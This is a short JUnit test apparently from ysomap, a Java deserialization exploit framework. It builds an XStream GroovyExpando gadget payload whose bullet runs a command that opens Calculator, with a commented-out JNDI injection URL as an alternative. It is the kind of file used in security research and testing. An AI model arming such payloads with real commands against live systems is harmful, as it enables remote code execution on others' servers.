package ysomap.core.payload.xstream;

import org.junit.Test;
import ysomap.core.bean.Bullet;
import ysomap.core.bean.Payload;

/**
 * @author wh1t3P1g
 * @since 2020/4/18
 */
public class GroovyExpandoTest {

    @Test
    public void pack() throws Exception {
        Payload payload = new GroovyExpando();
        Bullet bullet = payload.getDefaultBullet("open /System/Applications/Calculator.app");
//        Bullet bullet = new JdbcRowSetImplBullet().set("jndiURL", "rmi://localhost:1099/test");
        payload.setBullet(bullet);
//        Serializer serializer = payload.getSerializer();
//        String serialized = (String) serializer.serialize(payload.getObject());
//        serializer.serialize(payload.getObject(), System.out);
//        Object obj = serializer.deserialize(serialized);
//        System.out.println(obj);
    }
}